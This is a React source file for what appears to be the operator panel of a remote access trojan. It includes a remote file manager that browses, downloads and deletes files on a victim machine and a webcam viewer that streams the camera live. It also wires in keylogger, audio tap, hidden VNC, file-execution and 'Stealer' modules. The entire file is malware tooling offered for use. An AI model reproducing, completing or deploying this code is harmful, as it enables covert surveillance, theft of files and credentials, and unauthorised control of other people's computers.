import React, { useState, useEffect, useRef } from 'react';
import { useParams, Link, useNavigate } from 'react-router-dom';
import Terminal from '../components/Terminal';
import TaskManager from '../components/modules/TaskManager';
import Keylogger from '../components/modules/Keylogger';
import AudioTap from '../components/modules/AudioTap';
import OpenUrl from '../components/modules/OpenUrl';
import Chat from '../components/modules/Chat';
import SysInfo from '../components/modules/SysInfo';
import FileExecutor from '../components/modules/FileExecutor';
import RemoteDesktop from '../components/modules/RemoteDesktop';
import HVNC from '../components/modules/HVNC';
import Stealer from '../components/modules/Stealer';
import { ArrowLeft, Monitor, HardDrive, Cpu as CpuIcon, Shield, Terminal as TermIcon, Video, Settings, Play, Square, Folder, MousePointer, Activity, Volume2, Keyboard, FileText, Download, Trash2, CornerLeftUp, File, Edit, X, Save, Image as ImageIcon, Camera, Upload, RefreshCw, Plus, Minus, FolderPlus, FilePlus, Mic, MicOff, BarChart2, Globe, MessageSquare, Info, Zap } from 'lucide-react';

import { WS_BASE_URL } from '../config';

function FileManager({ agentId }) {
    const [files, setFiles] = useState([]);
    const [currentPath, setCurrentPath] = useState('C:\\');
    const [loading, setLoading] = useState(false);
    const [drives, setDrives] = useState([]);
    const [selectedFile, setSelectedFile] = useState(null);
    const [previewFile, setPreviewFile] = useState(null);
    const [editorContent, setEditorContent] = useState('');
    const [saving, setSaving] = useState(false);
    const [downloadingFile, setDownloadingFile] = useState(null);
    const wsRef = useRef(null);

    useEffect(() => {
        const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
        ws.binaryType = 'arraybuffer';
        wsRef.current = ws;

        ws.onopen = () => {
            console.log("[Files] Connected");
            ws.send("__LS__:root");
            setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) ws.send("__LS__:C:\\");
            }, 500);
        };

        ws.onmessage = (event) => {
            if (event.data instanceof ArrayBuffer) {
                const data = new Uint8Array(event.data);
                const decoder = new TextDecoder('utf-8');
                let textPrefix = "";
                try { textPrefix = decoder.decode(data.slice(0, 50)); } catch(e) {}

                if (textPrefix.startsWith("FILES:")) {
                    const fullText = decoder.decode(data);
                    const jsonStr = fullText.substring(6);
                    try {
                        const list = JSON.parse(jsonStr);
                        list.sort((a, b) => (a.is_dir === b.is_dir) ? 0 : a.is_dir ? -1 : 1);
                        const isRoot = list.some(f => f.name.includes(':'));
                        if (isRoot) setDrives(list.map(f => f.name.replace(/\\+$/, '\\')));
                        if (currentPath !== 'root' && currentPath !== '') setFiles(list);
                        setLoading(false);
                    } catch (e) { console.error("File JSON Error:", e); setLoading(false); }
                } else if (downloadingFile) {
                    const blob = new Blob([data]);
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url; a.download = downloadingFile;
                    document.body.appendChild(a); a.click();
                    document.body.removeChild(a); URL.revokeObjectURL(url);
                    setDownloadingFile(null);
                } else if (previewFile && previewFile.loading) {
                    if (previewFile.type === 'image') {
                        const blob = new Blob([data]);
                        const url = URL.createObjectURL(blob);
                        setPreviewFile(prev => ({ ...prev, loading: false, blobUrl: url }));
                    } else if (previewFile.type === 'text') {
                        const txt = decoder.decode(data);
                        setPreviewFile(prev => ({ ...prev, loading: false, content: txt }));
                        setEditorContent(txt);
                    }
                }
            }
        };
        return () => { if (ws.readyState === WebSocket.OPEN) ws.close(); };
    }, [agentId, downloadingFile, previewFile?.loading]);

    const navigate = (path) => {
        setLoading(true);
        let newPath = currentPath;
        if (path === '..') {
            if (!currentPath || currentPath.endsWith(':\\')) { setCurrentPath(''); wsRef.current.send("__LS__:root"); return; }
            const parts = currentPath.split('\\').filter(p=>p); parts.pop();
            newPath = parts.join('\\'); if (newPath.endsWith(':')) newPath += '\\';
        } else {
            if (path.includes(':')) newPath = path.endsWith('\\') ? path : path + '\\';
            else newPath = currentPath.endsWith('\\') ? currentPath + path : currentPath + '\\' + path;
        }
        setCurrentPath(newPath); wsRef.current.send(`__LS__:${newPath}`); setSelectedFile(null);
    };

    const handleDownload = () => { if (!selectedFile || selectedFile.is_dir) return; setDownloadingFile(selectedFile.name); wsRef.current.send(`__DL__:${currentPath.endsWith('\\') ? currentPath + selectedFile.name : currentPath + '\\' + selectedFile.name}`); };
    const handleDelete = () => { if (!selectedFile) return; if (!confirm(`Delete ${selectedFile.name}?`)) return; wsRef.current.send(`__RM__:${currentPath.endsWith('\\') ? currentPath + selectedFile.name : currentPath + '\\' + selectedFile.name}`); setLoading(true); setTimeout(() => navigate(currentPath), 500); };
    const handleNewFolder = () => { const name = prompt("New Folder Name:"); if (name) { wsRef.current.send(`__MKDIR__:${currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name}`); setTimeout(() => navigate(currentPath), 500); } };
    const handleNewFile = () => { const name = prompt("New File Name:"); if (name) { wsRef.current.send(`__SAVE__:${currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name}|`); setTimeout(() => navigate(currentPath), 500); } };

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] text-gray-300 font-mono text-sm relative">
            <div className="bg-[#1a1a1a] border-b border-[#333] p-2 flex flex-col gap-2">
                <div className="flex gap-2 overflow-x-auto pb-1 border-b border-[#222]">
                    <span className="text-gray-500 text-xs font-bold py-1 flex items-center gap-1"><HardDrive size={12}/> Drives:</span>
                    {drives.map(d => <button key={d} onClick={() => navigate(d)} className={`px-3 py-1 rounded text-xs font-bold transition ${currentPath.startsWith(d) ? 'bg-cyan-900/30 text-cyan-400 border border-cyan-900/50' : 'bg-[#222] text-gray-400 hover:text-white'}`}>{d}</button>)}
                </div>
                <div className="flex items-center gap-2">
                    <button onClick={() => navigate('..')} className="p-1.5 hover:bg-[#333] rounded transition"><CornerLeftUp size={16}/></button>
                    <button onClick={() => navigate(currentPath)} className="p-1.5 hover:bg-[#333] rounded transition"><RefreshCw size={16}/></button>
                    <div className="h-6 w-px bg-[#333] mx-1"></div>
                    <button onClick={handleNewFolder} className="p-1.5 hover:bg-[#333] rounded transition text-yellow-500" title="New Folder"><FolderPlus size={16}/></button>
                    <button onClick={handleNewFile} className="p-1.5 hover:bg-[#333] rounded transition text-blue-400" title="New File"><FilePlus size={16}/></button>
                    <div className="h-6 w-px bg-[#333] mx-1"></div>
                    <button onClick={() => navigate('C:\\Users')} className="px-2 py-1 hover:bg-[#333] rounded transition text-blue-400 font-bold text-xs">Users</button>
                    <div className="h-6 w-px bg-[#333] mx-1"></div>
                    <button onClick={handleDownload} disabled={!selectedFile || selectedFile.is_dir} className="p-1.5 hover:bg-[#333] rounded transition text-green-400 disabled:opacity-20"><Download size={16}/></button>
                    <button onClick={handleDelete} disabled={!selectedFile} className="p-1.5 hover:bg-[#333] rounded transition text-red-400 disabled:opacity-20"><Trash2 size={16}/></button>
                    <div className="flex-1 ml-2 bg-[#111] border border-[#333] px-3 py-1.5 rounded text-cyan-400 truncate cursor-text select-text">{currentPath || 'This PC'}</div>
                </div>
            </div>
            <div className="flex-1 overflow-auto p-2" onClick={() => setSelectedFile(null)}>
                {loading && <div className="text-center text-gray-500 mt-4 animate-pulse">Scanning Filesystem...</div>}
                <div className="grid grid-cols-[auto_1fr_auto] gap-x-4 gap-y-1 p-2">
                    <div className="text-gray-500 text-xs uppercase font-bold border-b border-[#333] pb-1">Type</div>
                    <div className="text-gray-500 text-xs uppercase font-bold border-b border-[#333] pb-1">Name</div>
                    <div className="text-gray-500 text-xs uppercase font-bold border-b border-[#333] pb-1 text-right">Size</div>
                    {files.map((f, i) => (
                        <React.Fragment key={i}>
                            <div className={`cursor-pointer flex items-center justify-center p-1 rounded ${selectedFile === f ? 'bg-[#222]' : ''}`} onClick={(e) => { e.stopPropagation(); setSelectedFile(f); }} onDoubleClick={() => f.is_dir ? navigate(f.name) : null}>
                                {f.is_dir ? <Folder size={14} className="text-yellow-500"/> : <FileText size={14} className="text-blue-400"/>}
                            </div>
                            <div className={`cursor-pointer p-1 rounded truncate ${selectedFile === f ? 'bg-[#222] text-white' : 'text-gray-300'}`} onClick={(e) => { e.stopPropagation(); setSelectedFile(f); }} onDoubleClick={() => f.is_dir ? navigate(f.name) : null}>{f.name}</div>
                            <div className="text-right text-gray-500 text-xs p-1">{f.is_dir ? '<DIR>' : (f.size / 1024).toFixed(1) + ' KB'}</div>
                        </React.Fragment>
                    ))}
                </div>
            </div>
        </div>
    );
}

function WebcamViewer({ agentId }) {
    const [imageSrc, setImageSrc] = useState(null);
    const [streaming, setStreaming] = useState(false);
    const [fps, setFps] = useState(15);
    const [quality, setQuality] = useState(50);
    const [camList, setCamList] = useState([]);
    const [selectedCam, setSelectedCam] = useState(0);
    const wsRef = useRef(null);

    useEffect(() => {
        const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
        ws.binaryType = 'arraybuffer'; wsRef.current = ws;
        ws.onopen = () => { console.log("[Cam] Connected"); ws.send("__GET_CAMS__"); };
        ws.onmessage = (event) => {
            if (event.data instanceof ArrayBuffer) {
                const data = new Uint8Array(event.data);
                if (data[0] === 0x03) {
                    const blob = new Blob([data.slice(1)], { type: 'image/jpeg' });
                    const url = URL.createObjectURL(blob);
                    setImageSrc(prev => { if (prev) URL.revokeObjectURL(prev); return url; });
                } else {
                    const text = new TextDecoder().decode(data);
                    if (text.startsWith("CAMS:")) {
                        const cams = text.substring(5).split(';').filter(x=>x).map(c => {
                            const [id, name] = c.split(':'); return { id: parseInt(id), name };
                        });
                        setCamList(cams);
                    }
                }
            }
        };
        return () => { if (ws.readyState === WebSocket.OPEN) ws.close(); };
    }, [agentId]);

    const toggleStream = (start) => {
        setStreaming(start);
        wsRef.current.send(start ? "__START_CAM__" : "__STOP_CAM__");
        if (!start) setImageSrc(null);
    };

    const updateConfig = (f, q, c) => { if (wsRef.current?.readyState === WebSocket.OPEN) wsRef.current.send(`__CAM_CONFIG__:${f},${q},${c}`); };

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] relative">
            <div className="bg-[#1a1a1a] border-b border-[#333] p-2 flex items-center gap-6 shadow-md z-10">
                <div className="flex gap-2 mr-4 border-r border-[#333] pr-6">
                    <button onClick={() => toggleStream(true)} disabled={streaming} className={`flex items-center gap-1 px-3 py-1.5 rounded-sm text-xs font-bold transition ${streaming ? 'bg-[#333] text-gray-500' : 'bg-red-900/20 text-red-400 hover:bg-red-500 hover:text-black'}`}><Video size={12} fill="currentColor" /> REC</button>
                    <button onClick={() => toggleStream(false)} disabled={!streaming} className={`flex items-center gap-1 px-3 py-1.5 rounded-sm text-xs font-bold transition ${!streaming ? 'bg-[#333] text-gray-500' : 'bg-gray-700 text-gray-300 hover:bg-gray-600'}`}><Square size={12} fill="currentColor" /> STOP</button>
                </div>
                <div className="flex items-center gap-4 text-xs text-gray-400">
                    <div className="flex items-center gap-2"><span>FPS: <span className="text-cyan-400">{fps}</span></span><input type="range" min="1" max="30" value={fps} onChange={(e) => { const v=parseInt(e.target.value); setFps(v); updateConfig(v, quality, selectedCam); }} className="w-24 h-1 bg-gray-700 rounded-lg appearance-none cursor-pointer accent-red-500" /></div>
                    <div className="flex items-center gap-2"><span>Quality:</span><select value={quality} onChange={(e) => { const v=parseInt(e.target.value); setQuality(v); updateConfig(fps, v, selectedCam); }} className="bg-[#111] border border-[#333] rounded px-2 py-1 outline-none"><option value="30">Low</option><option value="50">Med</option><option value="75">High</option></select></div>
                    <div className="flex items-center gap-2"><span>Device:</span><select value={selectedCam} onChange={(e) => { const v=parseInt(e.target.value); setSelectedCam(v); updateConfig(fps, quality, v); }} className="bg-[#111] border border-[#333] rounded px-2 py-1 outline-none min-w-[100px]">{camList.map(c => <option key={c.id} value={c.id}>{c.name}</option>)}</select></div>
                </div>
            </div>
            <div className="flex-1 flex items-center justify-center overflow-hidden bg-black relative">
                {imageSrc ? <img src={imageSrc} alt="Webcam" className="max-w-full max-h-full object-contain border-2 border-red-900/30" /> : <div className="text-gray-600 flex flex-col items-center animate-pulse"><Camera size={64} className="mb-4 opacity-20" /><p className="text-sm font-mono tracking-widest">CAMERA OFFLINE</p></div>}
                {streaming && <div className="absolute top-4 right-4 flex items-center gap-2"><div className="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div><span className="text-red-500 text-xs font-bold tracking-wider">LIVE</span></div>}
            </div>
        </div>
    );
}

export default function ClientDetail({ initialTab }) {
  const { id } = useParams();
  const activeTab = initialTab || 'terminal'; 

  return (
    <div className="h-full flex flex-col max-h-[calc(100vh-4rem)]">
      <div className="flex items-center justify-between mb-4 border-b border-[#222] pb-2">
        <div className="flex items-center gap-4">
            <Link to="/" className="p-2 rounded hover:bg-[#222] text-gray-500 hover:text-white transition"><ArrowLeft size={20} /></Link>
            <div><h2 className="text-xl font-bold text-white tracking-wide flex items-center gap-3"><Monitor size={20} className="text-cyan-400" />{id}</h2></div>
        </div>
        <div className="text-gray-500 text-xs font-mono uppercase tracking-widest">{activeTab.replace('_', ' ')} MODULE</div>
      </div>
      <div className="flex-1 bg-[#0f172a] border border-[#333] rounded-sm overflow-hidden shadow-2xl flex flex-col relative">
         {activeTab === 'terminal' && <Terminal agentId={id} />}
         {activeTab === 'screen' && <RemoteDesktop agentId={id} />}
         {activeTab === 'webcam' && <WebcamViewer agentId={id} />}
         {activeTab === 'audio' && <AudioTap agentId={id} />}
         {activeTab === 'keylog' && <Keylogger agentId={id} />}
         {activeTab === 'files' && <FileManager agentId={id} />}
         {activeTab === 'process' && <TaskManager agentId={id} />}
         {activeTab === 'browser' && <OpenUrl agentId={id} />}
         {activeTab === 'chat' && <Chat agentId={id} />}
         {activeTab === 'sysinfo' && <SysInfo agentId={id} />}
         {activeTab === 'hvnc' && <HVNC agentId={id} />}
         {activeTab === 'exec' && <FileExecutor agentId={id} />}
         {activeTab === 'stealer' && <Stealer agentId={id} />}
      </div>
    </div>
  );
}